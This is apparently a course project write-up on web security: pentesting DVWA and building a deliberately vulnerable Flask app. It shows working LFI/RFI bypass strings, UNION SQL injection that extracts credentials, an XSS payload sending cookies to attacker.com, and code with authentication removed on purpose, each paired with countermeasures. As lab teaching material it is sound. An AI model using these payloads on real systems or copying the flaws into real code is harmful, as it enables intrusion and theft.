# Web Security - Pentesting and Vulnerable Applications

## Overview

Practical **offensive and defensive cybersecurity** project exploring common web vulnerabilities through pentesting of intentionally vulnerable applications (DVWA) and development of a deliberately flawed application (PyFlaSQL).

## Context

As part of the "Web and IoT Network Security" course, this project provides practical skills in:
- Ethical penetration testing
- Vulnerability identification and exploitation
- Secure web application development
- Sensitive data protection

## Learning Objectives

- **Identify** common vulnerabilities (OWASP Top 10)
- **Exploit** these flaws ethically and in controlled environments
- **Understand** attack mechanisms
- **Learn** countermeasures and best practices
- **Develop** secure applications

## Project Structure

### 1. PortSwigger Academy
Cybersecurity learning platform with hands-on labs covering various web vulnerabilities.

### 2. DVWA Pentesting
Penetration testing on **Damn Vulnerable Web Application**, an intentionally vulnerable PHP/MySQL application with 3 difficulty levels (Low, Medium, High).

### 3. PyFlaSQL Development
Creating an intentionally vulnerable Flask (Python) application demonstrating OWASP Top 10 2021 flaws.

## Exploited Vulnerabilities on DVWA

### File Inclusion

**Principle**: Allows inclusion of unauthorized files (local or remote).

**Low Level:**
- No input validation
- **Exploitation**: `../../../../../../etc/passwd`
- **Result**: Access to system files

**Medium Level:**
- Protection using `str_replace()` removing `../` and `http://`
- **Bypass**:
  - LFI: `..././..././etc/passwd` (double encoding)
  - RFI: `hthttp://tp://IP:8000/shell.php`
- **Result**: Remote file inclusion → shell access

**High Level:**
- File must start with `file`
- **Bypass**: Protocol `file:///etc/passwd`
- **Result**: LFI possible, RFI blocked

**Countermeasure**: Strict validation, whitelist of allowed files.

### SQL Injection

**Principle**: Execution of unauthorized SQL queries to access/modify database.

**Detection**:
- Injection of `'` generates SQL error
- Vulnerability confirmed

**Exploitation (Low Level):**
```sql
' ORDER BY 3 --                    # Number of columns
' UNION SELECT database(), user() --   # DB info
' UNION SELECT table_name, NULL FROM information_schema.tables
  WHERE table_schema='dvwa' --     # List tables
' UNION SELECT user, password FROM users --  # Extract credentials
```

**Results**:
- Database name: `dvwa`
- Tables: `users`, `guestbook`
- Columns: `user_id`, `user`, `password`, etc.
- **Complete MD5 hash extraction**

**Countermeasure**: Prepared Statements, ORM.

### XSS Reflected (Cross-Site Scripting)

**Principle**: JavaScript injection executed immediately on victim's browser.

**Exploitation**:
```html
<script>alert('XSS')</script>
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Impact**: Cookie theft, session hijacking, malicious redirection.

**Countermeasure**: HTML escaping, Content Security Policy (CSP).

### XSS Stored (Persistent Cross-Site Scripting)

**Principle**: JavaScript code stored in database, executed for all visitors.

**More dangerous**: Affects all users, not just the target.

**Exploitation**: Injection in comment/guestbook forms.

**Countermeasure**: Server-side validation + HTML escaping.

## PyFlaSQL Application: Implemented Vulnerabilities

### A01:2021 - Broken Access Control

**Description**: Failed access control allowing resource access without authentication.

**Implementation**:
```python
def srie_home():
    # Login no longer required
    username = current_user.username if current_user.is_authenticated else "Guest"
    return render_template('srie/home.html', username=username)
```

**Exploitation**:
- **Before**: Mandatory login redirection
- **After**: Direct access without authentication

**Countermeasure**: `@login_required` decorators, verification middleware.

### A02:2021 - Cryptographic Failures

**Description**: Plaintext password storage in database.

**Implementation**:
- SQLite: `instance/database.db`
- Passwords **not hashed**

**Exploitation**:
```bash
sqlite3 database.db
SELECT user, password FROM users;
```

**Result**: All passwords directly readable.

**Countermeasure**: Secure hashing (bcrypt, Argon2, PBKDF2) + unique salt.

### A03:2021 - Injection

**Description**: Vulnerabilities allowing SQL, LDAP, OS injection, etc.

**Exploitation**: Similar to SQL injections on DVWA.

**Countermeasure**: Prepared queries, strict validation, least privilege principle.

## Technical Skills Acquired

### Pentesting

**Reconnaissance & Detection**:
- Source code analysis
- Special character testing
- Injection point identification

**Exploitation**:
- File Inclusion (LFI/RFI)
- SQL Injection (UNION, ORDER BY, information_schema)
- XSS (Reflected & Stored)
- Protection bypass

### Secure Development

**Best practices**:
- Input validation and sanitization
- Prepared statements
- Secure password hashing
- Robust access control (RBAC)
- Content Security Policy

### Awareness

- Real impact of vulnerabilities
- Data theft, session hijacking, server control
- Security by Design
- OWASP Top 10 2021

## Technologies Used

### Platforms & Tools
- **PortSwigger Academy**: Security labs
- **DVWA**: Vulnerable PHP/MySQL application
- **Burp Suite**: HTTP interception proxy
- **SQLite**: Database

### Languages & Frameworks
- **PHP** (DVWA)
- **Python + Flask** (PyFlaSQL)
- **SQL** (injections)
- **JavaScript** (XSS)

### Concepts
- OWASP Top 10 2021
- Ethical pentesting
- Web application security
- Cryptography (hashing)

## Results & Learnings

### Offensive Skills

✅ File Inclusion exploitation (all levels)
✅ SQL Injection with complete data extraction
✅ XSS Reflected and Stored
✅ Protection bypass (Medium/High)

### Defensive Skills

✅ Code flaw identification
✅ Countermeasure implementation
✅ Secure development (Flask)
✅ OWASP best practices

### Educational Impact

- **Deep understanding** of attack mechanisms
- **Awareness** of security risks
- **Ability** to develop secure applications
- **Protection** of sensitive user data

## Learned Countermeasures

### Input Validation
- Whitelist vs Blacklist
- Strict sanitization
- Type and format verification

### Data Security
- bcrypt/Argon2 hashing
- Unique salt per user
- Never plaintext storage

### Secure Architecture
- Systematic prepared statements
- Least privilege principle
- Separation of concerns
- Content Security Policy (CSP)

### Access Control
- Robust authentication
- Granular authorization (RBAC)
- Systematic permission validation

This project offers a **complete application security experience**, essential for any developer who must design and secure modern web applications against current threats.
